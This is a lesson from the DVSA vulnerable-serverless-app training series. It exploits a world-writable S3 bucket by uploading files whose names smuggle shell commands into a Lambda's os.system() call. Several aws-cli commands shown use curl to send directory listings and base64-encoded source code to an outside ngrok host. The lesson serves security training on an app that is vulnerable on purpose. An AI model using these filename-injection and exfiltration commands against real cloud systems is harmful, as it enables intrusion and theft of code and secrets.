
# LESSON #4: Insecure Cloud Configuration

The DVSA uses cloud storage (i.e. S3 bucket) to upload order receipts. After a payment is processed successfully, a receipt is issued and uploaded to the bucket. When the order is processed for shipment, the file is downloaded from the bucket, modified and uploaded back as a final format receipt that is sent to the user via email.

However, since the S3 is configured insecurely, it is possible to upload files to the bucket with any AWS account. For example, if you install the aws-cli, you can simply run the command: 

`aws s3 cp /path/to/local/file s3://DVSA-RECEIPTS-BUCKET-{id}`

![alt s3-upload](https://i.imgur.com/FatzTQh.png)

*Note, that you won't be able to run `ls` with an account different than the account where the DVSA is deployed, since it is misconfigured with WRITE permissions, and not with READ. At least not yet :)*

Let's see how to exploit it:

1. If you completed at least one order, you will receive an email with a link to download the receipt. It should look something like that:

![alt receipt-sample](https://i.imgur.com/XwcHgF3.png)


You can notice that the path to the file in the bucket is the date. e.g. `2018/12/24/{receipt-uuid}.txt`.

2. So let's fake a receipt and see what happens. Using the aws-cli we can simply run the command:

```
aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null_;curl 0c971764.ngrok.io?data="$(ls)";echo x.raw' --acl public-read --profile hacker
```
(The *echo x.raw* at the end of the file name is used to trigger the function, which is only triggered when a .raw file is created).

If we follow the path (_cd;_ your way in), eventually we will get:
![alt ls](https://i.imgur.com/mu2ky2O.png)


3. We know the file's name, let's extract its code:
```
aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null_;curl 0c971764.ngrok.io?code="$(cd x; cd y; cd z; cat send-receipt-email.py.py | base64 --wrap=0)" echo x.raw' --acl public-read --profile hacker
```

We now have the code in Base64 (I cut out most of it for a better screenshot).
![alt b64-code](https://i.imgur.com/KcklwO0.png)


Let's decode: `echo <BASE64_STRING> | base64 --decode > /tmp/lambda.py`

![alt code](https://i.imgur.com/GD3YwJg.png)

We can now see the vulnerable code - os.system() - which uses the name of the uploaded file as part of the command. 

You now have all the information to further exploit it, [stealing keys](../LESSONS/LESSON_05.md) or executing any other command.


- - -
[ToC](../LESSONS/README.md) | [1](../LESSONS/LESSON_01.md) | [2](../LESSONS/LESSON_02.md) | [3](../LESSONS/LESSON_03.md) | [4](../LESSONS/LESSON_04.md) | [5](../LESSONS/LESSON_05.md) | [6](../LESSONS/LESSON_06.md) | [7](../LESSONS/LESSON_07.md) | [8](../LESSONS/LESSON_08.md) | [9](../LESSONS/LESSON_09.md) | [10](../LESSONS/LESSON_10.md)

